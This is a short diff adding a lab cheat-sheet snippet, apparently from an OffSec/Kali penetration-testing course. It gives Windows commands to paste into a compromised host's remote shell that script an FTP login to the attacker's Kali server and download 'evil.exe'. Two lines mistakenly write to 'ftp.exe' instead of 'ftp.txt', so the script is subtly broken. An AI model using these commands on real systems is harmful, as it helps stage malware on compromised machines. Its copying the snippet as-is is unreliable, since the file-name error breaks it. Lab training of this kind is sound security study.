@@ -1,0 +1,13 @@
+# Copy paste the below commands into the remote shell:
+#		connect to ftp service on Kali
+#		user:offsec		pw:lab
+#		set binary mode / transfer type
+#		GET "evil.exe" from Kali ftp root dir
+#		execute ftp -s scripted commands
+echo open [kali ip] 21 > ftp.txt
+echo offsec >> ftp.txt
+echo lab >> ftp.txt
+echo bin >> ftp.txt
+echo GET evil.exe >> ftp.exe
+echo bye >> ftp.exe
+ftp -s:ftp.txt
